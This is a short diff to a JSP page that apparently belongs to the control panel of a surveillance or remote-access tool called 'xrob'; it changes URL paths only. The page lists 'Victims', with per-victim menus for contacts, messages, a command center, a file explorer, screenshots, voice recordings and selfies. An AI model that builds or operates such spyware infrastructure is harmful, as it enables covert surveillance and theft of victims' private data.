@@ -51,7 +51,7 @@
 
     <div class="row text-center">
         <ul id="nav_menu" class="breadcrumb">
-            <li><a href="/client/panel">Victims</a></li>
+            <li><a href="/xrob/client/panel">Victims</a></li>
             <li class="active"><%=theVictim.getIdentity()%>
             </li>
         </ul>
@@ -76,18 +76,18 @@
 
             final MenuItem[] menuItems = new MenuItem[]{
 
-                    new MenuItem(0, "Contacts", theVictim.getContactCount(), "/client/victim/contacts/" + victimCode),
-                    new MenuItem(1, "Deliveries", theVictim.getDeliveryCount(), "/client/victim/deliveries/" + victimCode),
-                    new MenuItem(2, "Command Center", theVictim.getCommandCount(), "/client/victim/command_center/" + victimCode),
-                    new MenuItem(3, "File explorer", theVictim.getFileBundleCount(), "/client/victim/file_manager/" + victimCode),
+                    new MenuItem(0, "Contacts", theVictim.getContactCount(), "/xrob/client/victim/contacts/" + victimCode),
+                    new MenuItem(1, "Deliveries", theVictim.getDeliveryCount(), "/xrob/client/victim/deliveries/" + victimCode),
+                    new MenuItem(2, "Command Center", theVictim.getCommandCount(), "/xrob/client/victim/command_center/" + victimCode),
+                    new MenuItem(3, "File explorer", theVictim.getFileBundleCount(), "/xrob/client/victim/file_manager/" + victimCode),
 
-                    new MenuItem(4, "Messages", theVictim.getMessageCount(), "/client/victim/messages/" + victimCode),
+                    new MenuItem(4, "Messages", theVictim.getMessageCount(), "/xrob/client/victim/messages/" + victimCode),
 
                     //TODO: Build media viewer.
-                    new MenuItem(5, "Files", theVictim.getMediaFileCount(), "/client/victim/media/files/" + victimCode),
-                    new MenuItem(6, "Screen Shots", theVictim.getMediaScreenShotCount(), "/client/victim/media/screen_shots/" + victimCode),
-                    new MenuItem(7, "Voices", theVictim.getMediaVoiceCount(), "/client/victim/media/voices/" + victimCode),
-                    new MenuItem(8, "Selfies", theVictim.getMediaSelfieCount(), "/client/victim/media/selfies/" + victimCode),
+                    new MenuItem(5, "Files", theVictim.getMediaFileCount(), "/xrob/client/victim/media/files/" + victimCode),
+                    new MenuItem(6, "Screen Shots", theVictim.getMediaScreenShotCount(), "/xrob/client/victim/media/screen_shots/" + victimCode),
+                    new MenuItem(7, "Voices", theVictim.getMediaVoiceCount(), "/xrob/client/victim/media/voices/" + victimCode),
+                    new MenuItem(8, "Selfies", theVictim.getMediaSelfieCount(), "/xrob/client/victim/media/selfies/" + victimCode),
             };
 
 
